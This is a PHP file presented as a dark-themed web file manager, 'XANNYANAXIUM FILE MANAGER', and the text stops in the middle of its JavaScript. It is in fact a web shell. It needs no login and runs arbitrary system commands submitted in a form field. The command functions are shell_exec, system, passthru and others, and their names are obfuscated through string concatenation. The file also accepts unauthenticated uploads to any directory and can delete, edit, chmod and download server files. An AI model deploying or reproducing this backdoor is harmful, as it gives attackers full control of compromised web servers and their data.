<?php
@ini_set('display_errors', '1');
@ini_set('log_errors', '1');
error_reporting(E_ALL);

// --- FIX FOR SESSION ERROR ---
// Force the use of file-based sessions. This overrides the server's default
// configuration which might be set to 'redis' and causing the connection error.
ini_set('session.save_handler', 'files');

// Fix session path issue from xenium3
 $sessionPath = sys_get_temp_dir() . '/php_sessions';
if (!@is_dir($sessionPath)) {
    @mkdir($sessionPath, 0700, true);
}
if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
    ini_set('session.save_path', $sessionPath);
}

session_start();

if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

// Handle special upload case from xenium3
if(!empty($_GET['upload_file']) && !empty($_GET['name'])){
    $targetDir = $_GET['upload_file'];
    $fileName = basename($_GET['name']);
    
    if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
        http_response_code(400);
        exit('Invalid filename');
    }
    
    // Ensure directory exists - fix from xenium2
    if (!@is_dir($targetDir)) {
        @mkdir($targetDir, 0755, true);
    }
    
    if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
        http_response_code(400);
        exit('Invalid directory');
    }
    
    $uploadPath = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR . $fileName;
    
    $inputHandler = fopen('php://input', "r");
    $fileHandler = fopen($uploadPath, "w+");
    
    if ($inputHandler && $fileHandler) {
        while(true) {
            $buffer = fgets($inputHandler, 4096);
            if (strlen($buffer) == 0) {
                fclose($inputHandler);
                fclose($fileHandler);
                @chmod($uploadPath, 0644);
                http_response_code(200);
                exit('File uploaded successfully');
            }
            fwrite($fileHandler, $buffer);
        }
    } else {
        http_response_code(500);
        exit('Upload failed');
    }
}

function validatePath($path) {
    $realPath = @realpath($path);
    if ($realPath && (@is_file($realPath) || @is_dir($realPath))) {
        return $realPath;
    }
    return false;
}

function sanitizeFileName($name) {
    $name = basename($name);
    $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
    if (empty($name) || $name === '.' || $name === '..') {
        return false;
    }
    return $name;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

 $notification = '';
 $errorMsg = '';

function runCommand($cmd) {
    if (empty(trim($cmd))) {
        return "No command provided";
    }
    
    $output = '';
    $methods = [
        's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c',
        'e'.'x'.'e'.'c',
        's'.'y'.'s'.'t'.'e'.'m',
        'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u',
        'p'.'o'.'p'.'e'.'n'
    ];

    foreach ($methods as $func) {
        if (function_exists($func)) {
            try {
                $result = call_user_func($func, $cmd . ' 2>&1');
                if ($result !== false && !empty(trim($result))) {
                    return $result;
                }
            } catch (Exception $e) {
                continue;
            }
        }
    }
    
    return "Command execution not available";
}

// Handle bulk delete - MUST BE BEFORE NAVIGATION
if (isset($_POST['bulk_delete']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
    $deleted = 0;
    $failed = 0;
    
    foreach ($_POST['selected_items'] as $item) {
        $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
        
        if ($targetPath === false) {
            $failed++;
            continue;
        }
        
        if (@is_file($targetPath)) {
            if (@unlink($targetPath)) {
                $deleted++;
            } else {
                $failed++;
            }
        } elseif (@is_dir($targetPath)) {
            try {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                
                foreach ($iterator as $file) {
                    if ($file->isDir()) {
                        @rmdir($file->getRealPath());
                    } else {
                        @unlink($file->getRealPath());
                    }
                }
                
                if (@rmdir($targetPath)) {
                    $deleted++;
                } else {
                    $failed++;
                }
            } catch (Exception $e) {
                $failed++;
            }
        }
    }
    
    if ($deleted > 0) {
        $notification = "Deleted $deleted item(s)";
        if ($failed > 0) {
            $notification .= " (Failed: $failed)";
        }
    } elseif ($failed > 0) {
        $errorMsg = "Failed to delete $failed item(s)";
    }
}

// Handle bulk download - MUST BE BEFORE NAVIGATION
if (isset($_POST['bulk_download']) && isset($_POST['selected_items']) && is_array($_POST['selected_items'])) {
    if (class_exists('ZipArchive')) {
        $zipName = 'selected_files_' . time() . '.zip';
        $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
        
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($_POST['selected_items'] as $item) {
                $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);
                
                if ($targetPath === false) continue;
                
                if (@is_file($targetPath)) {
                    $zip->addFile($targetPath, basename($targetPath));
                } elseif (@is_dir($targetPath)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );
                    
                    foreach ($files as $file) {
                        $filePath = $file->getRealPath();
                        $relativePath = basename($targetPath) . '/' . substr($filePath, strlen($targetPath) + 1);
                        
                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else {
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                }
            }
            
            $zip->close();
            
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zipName . '"');
            header('Content-Length: ' . filesize($zipPath));
            readfile($zipPath);
            @unlink($zipPath);
            exit;
        } else {
            $errorMsg = 'Bulk download failed: Could not create zip file';
        }
    } else {
        $errorMsg = 'Bulk download failed: ZipArchive not available';
    }
}

if (isset($_POST['navigate'])) {
    $targetDir = $_POST['navigate'];
    if (@is_dir($targetDir)) {
        $_SESSION['current_dir'] = validatePath($targetDir);
        $notification = 'Directory changed successfully';
    }
}

// Standard file upload from xenium2 with directory creation fix
if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] !== UPLOAD_ERR_NO_FILE) {
    if ($_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($_FILES['file_upload']['name']);
        $uploadPath = rtrim($_SESSION['current_dir'], '/\\') . DIRECTORY_SEPARATOR . $fileName;
        
        // Additional security check
        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            $errorMsg = 'Upload failed: Invalid filename';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Upload failed: Directory not writable';
        } elseif (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
            @chmod($uploadPath, 0644);
            $notification = 'File uploaded successfully';
        } else {
            $errorMsg = 'Upload failed: Could not move file. Check directory permissions.';
        }
    } else {
        $uploadErrors = [
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File partially uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
        ];
        $errorMsg = 'Upload error: ' . ($uploadErrors[$_FILES['file_upload']['error']] ?? 'Unknown error');
    }
}

if (isset($_POST['remove'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['remove']);
    
    if ($targetPath === false) {
        $errorMsg = 'Delete failed: Invalid path';
    } elseif (@is_file($targetPath)) {
        if (@unlink($targetPath)) {
            $notification = 'File deleted';
        } else {
            $errorMsg = 'Delete failed: Permission denied or file in use';
        }
    } elseif (@is_dir($targetPath)) {
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            
            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    @rmdir($file->getRealPath());
                } else {
                    @unlink($file->getRealPath());
                }
            }
            
            if (@rmdir($targetPath)) {
                $notification = 'Directory deleted';
            } else {
                $errorMsg = 'Delete failed: Could not remove directory';
            }
        } catch (Exception $e) {
            $errorMsg = 'Delete failed: ' . $e->getMessage();
        }
    } else {
        $errorMsg = 'Delete failed: Path not found';
    }
}

if (isset($_POST['old_name'], $_POST['new_name'])) {
    $sourcePath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['old_name']);
    
    if ($sourcePath === false) {
        $errorMsg = 'Rename failed: Source not found';
    } else {
        $destinationPath = dirname($sourcePath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        
        if (@file_exists($destinationPath)) {
            $errorMsg = 'Rename failed: Target name already exists';
        } elseif (@rename($sourcePath, $destinationPath)) {
            $notification = 'Rename successful';
        } else {
            $errorMsg = 'Rename failed: Permission denied or invalid name';
        }
    }
}

// File editing without base64 encoding
if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
    $editPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['file_to_edit']);
    
    if ($editPath === false || !@is_file($editPath)) {
        $errorMsg = 'Edit failed: File not found';
    } elseif (!@is_writable($editPath)) {
        $errorMsg = 'Edit failed: File not writable';
    } else {
        // Direct content without base64 decoding
        if (@file_put_contents($editPath, $_POST['file_content']) !== false) {
            $notification = 'File saved';
        } else {
            $errorMsg = 'Edit failed: Could not write to file';
        }
    }
}

// Handle chmod
if (isset($_POST['chmod_item'], $_POST['chmod_value'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['chmod_item']);
    
    if ($targetPath === false) {
        $errorMsg = 'Chmod failed: Invalid path';
    } else {
        // Convert octal string to integer
        $chmodValue = octdec($_POST['chmod_value']);
        
        if (@chmod($targetPath, $chmodValue)) {
            $notification = 'Permissions changed successfully';
        } else {
            $errorMsg = 'Chmod failed: Permission denied';
        }
    }
}

if (isset($_POST['create_file']) && trim($_POST['create_file']) !== '') {
    $fileName = sanitizeFileName($_POST['create_file']);
    
    if ($fileName === false) {
        $errorMsg = 'Create failed: Invalid filename';
    } else {
        $newFilePath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName;
        
        if (@file_exists($newFilePath)) {
            $errorMsg = 'Create failed: File already exists';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Create failed: Directory not writable';
        } elseif (@file_put_contents($newFilePath, '') !== false) {
            @chmod($newFilePath, 0644);
            $notification = 'File created';
        } else {
            $errorMsg = 'Create failed: Could not create file';
        }
    }
}

if (isset($_POST['create_folder']) && trim($_POST['create_folder']) !== '') {
    $folderName = sanitizeFileName($_POST['create_folder']);
    
    if ($folderName === false) {
        $errorMsg = 'Create failed: Invalid folder name';
    } else {
        $newFolderPath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $folderName;
        
        if (@file_exists($newFolderPath)) {
            $errorMsg = 'Create failed: Folder already exists';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Create failed: Directory not writable';
        } elseif (@mkdir($newFolderPath, 0755)) {
            $notification = 'Folder created';
        } else {
            $errorMsg = 'Create failed: Could not create folder';
        }
    }
}

 $currentDirectory = $_SESSION['current_dir'];
 $directoryContents = scandir($currentDirectory);
 $folders = $files = [];

foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    $fullPath = $currentDirectory . '/' . $item;
    if (@is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($folders);
sort($files);
 $allItems = array_merge($folders, $files);

 $fileToEdit = $_POST['edit'] ?? null;
 $fileToView = $_POST['view'] ?? null;
 $itemToRename = $_POST['rename'] ?? null;
 $itemToChmod = $_POST['chmod'] ?? null;
 $fileContent = $fileToEdit ? @file_get_contents($currentDirectory . '/' . $fileToEdit) : null;
 $viewContent = $fileToView ? @file_get_contents($currentDirectory . '/' . $fileToView) : null;

// Handle file/folder download
if (isset($_POST['download'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['download']);
    
    if ($targetPath === false) {
        $errorMsg = 'Download failed: Invalid path';
    } elseif (@is_file($targetPath)) {
        // Direct file download
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
        header('Content-Length: ' . filesize($targetPath));
        readfile($targetPath);
        exit;
    } elseif (@is_dir($targetPath)) {
        // Zip folder and download
        if (class_exists('ZipArchive')) {
            $zipName = basename($targetPath) . '_' . time() . '.zip';
            $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;
            
            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                
                foreach ($files as $file) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($targetPath) + 1);
                    
                    if ($file->isDir()) {
                        $zip->addEmptyDir($relativePath);
                    } else {
                        $zip->addFile($filePath, $relativePath);
                    }
                }
                
                $zip->close();
                
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zipName . '"');
                header('Content-Length: ' . filesize($zipPath));
                readfile($zipPath);
                @unlink($zipPath);
                exit;
            } else {
                $errorMsg = 'Download failed: Could not create zip file';
            }
        } else {
            $errorMsg = 'Download failed: ZipArchive not available';
        }
    }
}

 $commandResult = '';
 $commandAvailable = false;

 $methods = [
    's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c',
    'e'.'x'.'e'.'c',
    's'.'y'.'s'.'t'.'e'.'m',
    'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u'
];

foreach ($methods as $func) {
    if (function_exists($func)) {
        $commandAvailable = true;
        break;
    }
}

if (isset($_POST['terminal_command']) && trim($_POST['terminal_command']) !== '') {
    $cmd = trim($_POST['terminal_command']);
    if (!empty($cmd)) {
        try {
            $commandResult = runCommand($cmd);
            if (empty(trim($commandResult)) || $commandResult === "Command execution not available") {
                $errorMsg = 'Command execution: No output or function disabled';
            }
        } catch (Exception $e) {
            $errorMsg = 'Command error: ' . htmlspecialchars($e->getMessage());
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XANNYANAXIUM FILE MANAGER</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #1a1b1e;
            color: #e4e6eb;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            font-size: 13px;
            line-height: 1.5;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        h1 {
            font-size: 16px;
            font-weight: 500;
            color: #e4e6eb;
            margin-bottom: 4px;
            letter-spacing: -0.01em;
        }
        
        .subtitle {
            color: #9ca3af;
            font-size: 13px;
            margin-bottom: 20px;
            font-weight: 400;
        }
        
        .alert {
            padding: 10px 12px;
            border-radius: 4px;
            margin-bottom: 12px;
            font-size: 13px;
            border: 1px solid;
        }
        
        .alert-success {
            background: rgba(34, 197, 94, 0.1);
            border-color: rgba(34, 197, 94, 0.3);
            color: #22c55e;
        }
        
        .alert-danger {
            background: rgba(239, 68, 68, 0.1);
            border-color: rgba(239, 68, 68, 0.3);
            color: #ef4444;
        }
        
        .section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            padding: 14px;
            margin-bottom: 12px;
        }
        
        .section-title {
            font-size: 13px;
            font-weight: 500;
            color: #e4e6eb;
            margin-bottom: 10px;
        }
        
        .input-group {
            display: flex;
            gap: 6px;
            margin-bottom: 6px;
        }
        
        .input-group:last-child {
            margin-bottom: 0;
        }
        
        input[type="text"],
        input[type="file"],
        textarea,
        select {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 6px 10px;
            color: #e4e6eb;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            font-size: 13px;
            transition: all 0.15s ease;
            outline: none;
            flex: 1;
        }
        
        input[type="text"]:focus,
        textarea:focus,
        select:focus {
            border-color: rgba(255, 255, 255, 0.2);
            background: rgba(0, 0, 0, 0.3);
        }
        
        input[type="file"] {
            cursor: pointer;
            padding: 6px 10px;
        }
        
        input[type="file"]::file-selector-button {
            background: rgba(255, 255, 255, 0.06);
            color: #e4e6eb;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 6px 12px;
            font-size: 13px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.15s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            margin-right: 10px;
        }
        
        input[type="file"]::file-selector-button:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
        }
        
        textarea {
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            resize: vertical;
            min-height: 400px;
            height: 500px;
            line-height: 1.5;
            font-size: 12px;
            width: 100%;
            display: block;
            scrollbar-width: thin;
            scrollbar-color: rgba(255, 255, 255, 0.2) rgba(0, 0, 0, 0.3);
        }
        
        textarea::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        
        textarea::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 4px;
        }
        
        textarea::-webkit-scrollbar-thumb {
            background: rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            border: 2px solid rgba(0, 0, 0, 0.3);
        }
        
        textarea::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 255, 255, 0.3);
        }
        
        .btn {
            background: rgba(255, 255, 255, 0.06);
            color: #e4e6eb;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 6px 12px;
            font-size: 13px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.15s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
            white-space: nowrap;
        }
        
        .btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
        }
        
        .btn:active {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .btn-primary {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border-color: rgba(34, 197, 94, 0.3);
        }
        
        .btn-primary:hover {
            background: rgba(34, 197, 94, 0.25);
            border-color: rgba(34, 197, 94, 0.4);
        }
        
        .btn-create {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border-color: rgba(34, 197, 94, 0.3);
        }
        
        .btn-create:hover {
            background: rgba(34, 197, 94, 0.25);
            border-color: rgba(34, 197, 94, 0.4);
        }
        
        .btn-danger {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-color: rgba(239, 68, 68, 0.3);
        }
        
        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.25);
            border-color: rgba(239, 68, 68, 0.4);
        }
        
        .btn-sm {
            padding: 4px 10px;
            font-size: 12px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            overflow: hidden;
            table-layout: fixed;
        }
        
        thead {
            background: rgba(255, 255, 255, 0.03);
        }
        
        th {
            padding: 8px 12px;
            font-weight: 500;
            text-align: left;
            color: #9ca3af;
            font-size: 12px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
            white-space: nowrap;
        }
        
        td {
            padding: 8px 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            font-size: 13px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        tbody tr {
            transition: background 0.15s ease;
        }
        
        tbody tr:hover {
            background: rgba(255, 255, 255, 0.03);
        }
        
        .file-icon {
            display: inline-block;
            width: 14px;
            text-align: center;
            margin-right: 6px;
            opacity: 0.6;
            font-size: 11px;
        }
        
        .file-name {
            color: #e4e6eb;
            font-weight: 400;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            max-width: 100%;
            overflow: hidden;
            text-overflow: ellipsis;
            vertical-align: middle;
        }
        
        .file-name:hover {
            color: #22c55e;
            text-decoration: underline;
        }
        
        .file-size {
            color: #9ca3af;
            font-size: 12px;
            text-align: right;
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
        }
        
        .file-date {
            color: #9ca3af;
            font-size: 12px;
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            text-align: center;
        }
        
        .file-type {
            color: #9ca3af;
            font-size: 12px;
            font-weight: 500;
        }
        
        .writable {
            color: #22c55e;
            font-size: 12px;
        }
        
        .readonly {
            color: #ef4444;
            font-size: 12px;
        }
        
        .action-buttons {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }
        
        .action-buttons form {
            margin: 0;
        }
        
        .action-buttons .btn {
            padding: 4px 8px;
            font-size: 12px;
        }
        
        .rename-form {
            display: flex;
            gap: 6px;
            align-items: center;
        }
        
        .rename-form input {
            flex: 1;
            padding: 4px 8px;
            font-size: 13px;
        }
        
        .chmod-form {
            display: flex;
            gap: 6px;
            align-items: center;
        }
        
        .chmod-form input {
            width: 80px;
            padding: 4px 8px;
            font-size: 13px;
            text-align: center;
        }
        
        .chmod-form select {
            width: 100px;
            padding: 4px 8px;
            font-size: 13px;
        }
        
        .code-block {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
            padding: 12px;
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.5;
            color: #e4e6eb;
            overflow-x: auto;
            white-space: pre;
        }
        
        .terminal-output {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(34, 197, 94, 0.3);
            border-radius: 4px;
            padding: 12px;
            font-family: 'SF Mono', Monaco, 'Cascadia Code', 'Roboto Mono', Consolas, 'Courier New', monospace;
            font-size: 12px;
            color: #22c55e;
            overflow-x: auto;
            white-space: pre;
            line-height: 1.5;
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        @media (max-width: 768px) {
            .grid-2 {
                grid-template-columns: 1fr;
            }
            
            body {
                padding: 12px;
            }
            
            .action-buttons {
                justify-content: flex-start;
            }
        }
        
        .up-btn {
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #e4e6eb;
            margin-bottom: 12px;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .up-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.15);
        }
        
        .bulk-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            margin-bottom: 12px;
            padding: 12px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 4px;
        }
        
        .bulk-actions-text {
            color: #9ca3af;
            font-size: 13px;
            margin-right: auto;
        }
        
        input[type="checkbox"] {
            appearance: none;
            -webkit-appearance: none;
            width: 16px;
            height: 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            background: rgba(0, 0, 0, 0.3);
            cursor: pointer;
            position: relative;
            transition: all 0.15s ease;
        }
        
        input[type="checkbox"]:hover {
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(0, 0, 0, 0.4);
        }
        
        input[type="checkbox"]:checked {
            background: rgba(34, 197, 94, 0.2);
            border-color: #22c55e;
        }
        
        input[type="checkbox"]:checked::after {
            content: '✓';
            position: absolute;
            top: -1px;
            left: 2px;
            color: #22c55e;
            font-size: 12px;
            font-weight: bold;
        }
        
        th input[type="checkbox"] {
            margin: 0;
        }
        
        td input[type="checkbox"] {
            margin-right: 8px;
        }
        
        .upload-tabs {
            display: flex;
            margin-bottom: 10px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .upload-tab {
            padding: 8px 12px;
            cursor: pointer;
            border-bottom: 2px solid transparent;
            transition: all 0.2s;
        }
        
        .upload-tab.active {
            border-bottom-color: #22c55e;
            color: #22c55e;
        }
        
        .upload-tab:hover {
            color: #e4e6eb;
        }
        
        .upload-panel {
            display: none;
        }
        
        .upload-panel.active {
            display: block;
        }
        
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
        }
        
        .modal-content {
            background-color: #2a2d35;
            margin: 10% auto;
            padding: 20px;
            border-radius: 8px;
            width: 400px;
            max-width: 90%;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .modal-title {
            font-size: 16px;
            font-weight: 500;
            color: #e4e6eb;
        }
        
        .close {
            color: #9ca3af;
            font-size: 24px;
            font-weight: bold;
            cursor: pointer;
            line-height: 1;
        }
        
        .close:hover {
            color: #e4e6eb;
        }
        
        .chmod-options {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .chmod-group {
            text-align: center;
        }
        
        .chmod-group label {
            display: block;
            margin-bottom: 5px;
            font-size: 12px;
            color: #9ca3af;
        }
        
        .chmod-group input[type="checkbox"] {
            margin: 0 2px;
        }
    </style>
    <script>
        function toggleSelectAll(checkbox) {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]');
            checkboxes.forEach(cb => cb.checked = checkbox.checked);
            updateBulkActions();
        }
        
        function updateBulkActions() {
            const checkboxes = document.querySelectorAll('input[name="selected_items[]"]:checked');
            const bulkActions = document.getElementById('bulk-actions');
            const countText = document.getElementById('selected-count');
            
            if (checkboxes.length > 0) {
                bulkActions.style.display = 'flex';
                countText.textContent = checkboxes.length + ' item(s) selected';
            } else {
                bulkActions.style.display = 'none';
            }
        }
        
        function switchUploadTab(tabId) {
            // Hide all panels
            document.querySelectorAll('.upload-panel').forEach(panel => {
                panel.classList.remove('active');
            });
            
            // Remove active class from all tabs
            document.querySelectorAll('.upload-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected panel
            document.getElementById(tabId + '-panel').classList.add('active');
            
            // Add active class to selected tab
            document.getElementById(tabId + '-tab').classList.add('active');
        }
        
        function uploadFile() {
            var fileInput = document.getElementById('upload_files');
            var statusSpan = document.getElementById('upload_status');
            
            if (!fileInput.files || fileInput.files.length === 0) {
                statusSpan.textContent = "No file selected";
                statusSpan.style.color = "red";
                return;
            }
            
            var file = fileInput.files[0];
            var filename = file.name;
            var currentDir = "<?= addslashes($_SESSION['current_dir']) ?>";
            var scriptUrl = window.location.pathname;
            
            statusSpan.textContent = "Uploading " + filename + ", please wait...";
            statusSpan.style.color = "blue";
            
            var reader = new FileReader();
            reader.readAsBinaryString(file);
            
            reader.onloadend = function(evt) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", scriptUrl + "?upload_file=" + encodeURIComponent(currentDir) + "&name=" + encodeURIComponent(filename), true);
                
                XMLHttpRequest.prototype.mySendAsBinary = function(text) {
                    var data = new ArrayBuffer(text.length);
                    var ui8a = new Uint8Array(data, 0);
                    for (var i = 0; i < text.length; i++) {
                        ui8a[i] = (text.charCodeAt(i) & 0xff);
                    }
                    
                    if (typeof window.Blob == "function") {
                        var blob = new Blob([data]);
                    } else {
                        var bb = new (window.MozBlobBuilder || window.WebKitBlobBuilder || window.BlobBuilder)();
                        bb.append(data);
                        var blob = bb.getBlob();
                    }
                    
                    this.send(blob);
                }
                
                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        if (xhr.status == 200) {
                            statusSpan.textContent = "File " + filename + " uploaded successfully!";
                            statusSpan.style.color = "#22c55e";
                            setTimeout(function() {
                                location.reload();
                            }, 1000);
                        } else {
                            statusSpan.textContent = "Upload failed: " + xhr.responseText;
                            statusSpan.style.color = "red";
                        }
                    }
                };
                
                xhr.mySendAsBinary(evt.target.result);
            };
        }
        
        function openChmodModal(itemName) {
            document.getElementById('chmodModal').style.display = 'block';
            document.getElementById('chmodItem').value = itemName;
            
            // Get current permissions
            var currentPerms = document.getElementById('currentPerms_' + itemName.replace(/[^a-zA-Z0-9]/g, '_')).value;
            updateChmodDisplay(currentPerms);
        }
        
        function closeChmodModal() {
            document.getElementById('chmodModal').style.display = 'none';
        }
        
        function updateChmodDisplay(perms) {
            document.getElementById('chmodOctal').value = perms;
            
            // Convert octal to binary for checkboxes
            var octal = parseInt(perms, 8);
            var binary = octal.toString(2).padStart(9, '0');
            
            // Owner permissions
